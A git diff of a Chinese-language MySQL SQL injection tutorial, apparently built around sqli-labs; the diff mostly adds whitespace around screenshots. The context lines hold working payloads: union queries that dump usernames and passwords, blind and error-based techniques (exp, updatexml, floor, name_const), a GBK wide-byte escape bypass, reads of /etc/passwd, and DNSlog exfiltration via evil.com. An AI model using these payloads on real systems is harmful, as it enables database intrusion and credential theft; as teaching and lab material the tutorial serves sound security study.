@@ -27,7 +27,9 @@ MySQL注入相对于其他注入可能对于大家来讲应该是最拿得出手
 使用 `order/group by`语句，通过拼接数字，可确定字段数量，若大于，则页面错误/无内容，若小于/等于，则页面正常。若错误页面与正常页面一致，更换盲注或报错注入
 正常页面：
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_10_PvZFTcXa.png)
+
 错误页面：
+
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_10_Z8K10wlP.png)
 
 2. 判断页面回显位
@@ -40,8 +42,11 @@ MySQL注入相对于其他注入可能对于大家来讲应该是最拿得出手
 - 如果union前面的查询条件返回为空的情况下，也没有标记数字，这时候一般是类型出错，导致无法显示在页面，可以将数字更改未null，如下所示
 
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_10_baYkACOu.png)
+
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_11_CYbGdH36.png)
+
 这里在以sqli-labs 的less 1举例说明
+
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_11_UdHvViZu.png)
 
 3. 通过第2步，找到显位之后，在显示字段位置使用子查询或直接查询，来查询数据。
@@ -52,6 +57,7 @@ MySQL注入相对于其他注入可能对于大家来讲应该是最拿得出手
 直接猜库名，表名，列名，再使用联合查询，当然也可以使用布尔注入来猜解
 若MySQL版本 >= 5.0
 我们看以下SQL语句，使用该语句则可以获取所有的数据库，如果不涉及跨库查询，这一步可以省略
+
 ```sql
 -- sql
 select schema_name from information_schema.schemata;
@@ -59,23 +65,32 @@ select schema_name from information_schema.schemata;
 ?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+
 ```
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_11_sBGcU3KI.png)
+
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_12_msrXBtUW.png)
+
 查表名
+
 ```sql
 ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
 ```
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_12_wuWBrLPh.png)
+
 查列名
+
 ```sql
 ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
 ```
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_12_m2bIHrxY.png)
+
 查值
+
 ```sql
 ?id=-1' union select 1,2,group_concat(0x23,username,0x23,password) from users--+
 ```
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_12_fB4iwh9z.png)
+
 简单来说，查库名 -> 查表名 -> 查列名 -> 查值
+
 ```sql
 -- 判断字段数目
 order by 
@@ -101,10 +116,15 @@ union select 1,2,group_concat(id,name,age) from student;
 select * from users where username=$username and (condition)
 ```
 and 1=1 恒真
+
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_12_Fyz9Ho0i.png)
+
 and 1=2 恒假
+
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_13_mCt1P8dn.png)
+
 利用这一特性，我们可以构造payload 通过来页面显示情况来获取数据库数据
+
 #### 布尔盲注常用函数
 
 - ascii() 返回指定字符的ascii码值
@@ -220,7 +240,9 @@ and 1=2 恒假
 ### 时间盲注
 
 通过判断页面返回内容的响应时间差异进行条件判断。
+
 通常可利用的产生时间延迟的函数有：sleep()、benchmark()，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、复杂正则表达式等等。
+
 #### 时间盲注常用函数
 
 - if(1,2,3)：如果1为True，则执行2，否则执行3
@@ -253,6 +275,7 @@ select BENCHMARK(10000000,md5('a'));
 select * from users where id = 1 and (select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C);
 ```
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_13_rSjUaHeQ.png)
+
 ## 报错注入
 服务器开启报错信息返回，也就是发生错误时返回报错信息，通过特殊函数的错误使用使其参数被页面输出。
 
@@ -264,10 +287,15 @@ select * from users where id = 1 and (select count(*) from information_schema.co
 在mysql>5.5.53时，则不能返回查询结果；
 在版本号为5.5.47上可以用来注入：
 该函数将会返回e的x次方结果。正常如下图：
+
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_14_dJSvfILW.png)
+
 e的x次方到x每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错
+
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_14_Nz0RAegx.png)
+
 将0按位取反，`~0`，可以看到取值为`18446744073709551615`，这个值就比709要大很多很多，所以再利用mysql 函数正常取值之后会返回0的特性，那么当函数执行成功，然后按位取反之后得到的值直接造成double型溢出
+
 ```sql
 select exp(~(select * from (select version())x));
 ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '5.5.47-0ubuntu0.14.04.1' from dual)))'
@@ -276,6 +304,7 @@ ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '5.5.47-0ubun
 ?id=1' and exp(~(select * from (select version())x))--+
 ```
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_14_P2DCMRV1.png)
+
 exp()函数套用两层的子查询的原因：
 
 1. 先查询 select user() 这里面的语句，将这里面查询出来的数据作为一个结果集 取名为 a
@@ -315,7 +344,9 @@ mid(concat(0x23,(SELECT group_concat(table_name) from information_schema.tables 
 ,0x23),1,32))--+
 ```
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_14_VWinxIZ3.png)
+
 其他爆库，爆字段，爆数据库值等更改SQL语句即可
+
 ### updatexml()
 函数语法：`updatexml(XML_document,XPath_String,new_value)`
 适用范围：5.1.5+
@@ -327,6 +358,7 @@ updatexml(1,concat(0x23,user(),0x23),1)
 ?id=1' and updatexml(1,mid(concat(0x23,(SELECT group_concat(table_name) from information_schema.tables where table_schema = database()),0x23),1,32),1)--+
 ```
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_15_6W53B7nt.png)
+
 ### floor报错
 相关函数：
 
@@ -334,7 +366,10 @@ updatexml(1,concat(0x23,user(),0x23),1)
 - rand() 函数，取随机数，若有参数x，则每个x对应一个固定的值，如果连续多次执行会变化，但是可以预测
 - floor( rand( 0 ) * 2 ) 产生的序列为011011...
 
+
+
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_15_usYgtDEG.png)
+
 报错原理：
 利用数据库表主键不能重复的原理，使用 GROPU BY 分组，产生主键key冗余，导致报错
 
@@ -410,7 +445,10 @@ database(),
 as y)
 ```
 由于 and 后要跟1或者0，所以构造sql语句select 1 ，其中 concat()函数是用来连接字符串的函数，因为information_schema.'columns'的数据是大于3条，所以会出现报错，报错结果或将别名x的信息展示出来，展示信息为#(数据库名称)#1冗余
+
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_15_m6lHPBfk.png)
+
+
 
 - 爆表
 ```sql
@@ -422,6 +460,7 @@ from information_schema.`COLUMNS` GROUP BY x)
 as y)
 ```
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_16_HlSxkWPY.png)
+
 ### 几何函数
 
 - GeometryCollection：id=1 AND GeometryCollection((select * from (select* from(select user())a)b))
@@ -431,10 +470,17 @@ as y)
 - linestring()：id=1 AND LINESTRING((select * from(select * from(select user())a)b))
 - multipolygon() ：id=1 AND multipolygon((select * from(select * from(select user())a)b))
 
+
+
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_16_leC45ZXp.png)
+
+
+
 ### 不存在的函数
 随便使用不存在的函数，可能会得到当前所在数据库的名称
+
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_17_g8bjluka.png)
+
 ### BIGINT
 当mysql数据库的某些边界数值进行数值运算时，会报错的原理。
 如~0得到的结果：18446744073709551615
@@ -446,6 +492,7 @@ select !(select * from(select user())a)-~0;
 select * from users where id = 1 and (select !(select * from(select mid(group_concat(table_name),21,32) from information_schema.tables where table_schema = database())a)-~0);
 ```
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_17_4Zv8eblY.png)
+
 ### name_const()
 报错原理：
 mysql列名重复会导致报错,通过name_const制造一个列
@@ -456,6 +503,7 @@ select * from users where id = 1 and
 (select * from(select name_const(version(),0x1),name_const(version(),0x1))a);
 ```
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_17_rFsH3Jqj.png)
+
 ### uuid
 适用版本：8.0.x
 ```sql
@@ -464,6 +512,7 @@ SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));
 ```
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_18_j7IfwYqX.png)
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_18_EQisqFBy.png)
+
 ### join using
 通过系统关键词join可建立两个表之间的内连接。
 通过对想要查询列名的表与其自身建立内连接，会由于冗余的原因(相同列名存在)，而发生错误。
@@ -515,16 +564,23 @@ payload1
 SELECT * FROM users WHERE id='1�\' and 1=1-- ' LIMIT 0,1
 ```
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_19_nDfqCLdM.png)
+
 payload2
 为了避免漏洞，网站一般会设置UTF-8编码，然后进行转义过滤。但是由于一些不经意的字符集转换，又会导致漏洞
 使用set name UTF-8指定了utf-8字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的GBK字符使用iconv()函数先转为UTF-8，然后再拼接SQL语句
 测试语句：
+
 ```php
 ?id=1%e5%5c%27 and 1=1 --+
 ```
 `%e5%5c` 是gbk编码，转换为UTF-8编码是`%e9%8c%a6`
+
 `%e5%5c%27`首先从gbk编码经过addslashes函数之后变成`%e5%5c%5c%5c%27`，再通过iconv()将其转换为UTF-8编码，`%e9%8c%a6%5c%5c%27` ，其中`%e9%8c%a6`是汉字，`%5c%5c%27`解码之后是`\\'`第一个`\`将第二个`\`转义，使得%27单引号逃逸，成功闭合语句
+
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_19_xk3HTvnl.png)
+
+
+
 ## order by 注入
 order by 注入通常出现在排序中，前端展示的表格，某一列需要进行升序或者降序排列，或者做排名比较的时候常常会用到`order by`排序，`order by`在select语句中，紧跟在`where [where condition]`后，且order by 注入无法使用预编译来防御，由于order by 后面需要紧跟`column_name`，而预编译是参数化字符串，而`order by`后面紧跟字符串就会提示语法错误，通常防御order by 注入需要使用白名单的方式。
 以SQLi-Labs Less46 为例
@@ -665,6 +721,7 @@ show variables like "secure_file_priv";
 select load_file(file_path); -- file_path为绝对路径
 ```
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_20_C6D1yFcz.png)
+
 ```sql
 load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n'; --读取服务端上的文件
 ```
@@ -714,7 +771,9 @@ mysql> set global slow_query_log=1;
 ## DNSlog外带数据盲注
 DNSLOG，简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问/请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。
 如何用DNSLOG带出数据？若我们想要查询的数据为：aabbcc，那么我们让mysql服务端去请求aabbcc.evil.com，通过记录evil.com的DNS记录，就可以得到数据：aabbcc。
+
 ![image.png](./MySQL注入基础.assets/2023_05_19_10_41_21_T48bBnfv.png)
+
 应用场景：
 
 - 三大注入无法使用
